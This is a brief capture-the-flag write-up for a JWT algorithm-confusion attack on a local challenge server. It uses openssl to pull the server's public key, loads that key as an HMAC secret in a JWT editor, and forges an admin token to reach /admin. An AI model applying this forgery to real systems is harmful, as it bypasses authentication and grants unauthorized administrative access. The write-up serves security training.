# Write-Up
1. Extract Server Certificate

```bash
openssl s_client -showcerts -connect localhost:1337 </dev/null 2>/dev/null | openssl x509 -outform PEM > server.crt
```

2. Extract the public key form the certificate 

```bash 
openssl x509 -pubkey -noout -in server.crt > server_public.key
```

3. convert the public key into b64 format (make sure to remove the last empty line after `-----END PUBLIC KEY-----`)

```bash 
cat server_public.key | base64 

```

4. Go to the JWT Editor Keys tab and click New Symmetric Key.

5. In the dialog, click Generate to generate a new key in JWK format.

6. Replace the generated value for the `k` parameter with a Base64-encoded PEM key that you just copied.

7. Save the key.

8. Intercept a request to `/admin`

9. Modify the token 

```json
{"name":"admin"}
```

10. Sign it with the new key

11. Send the request and get the flag

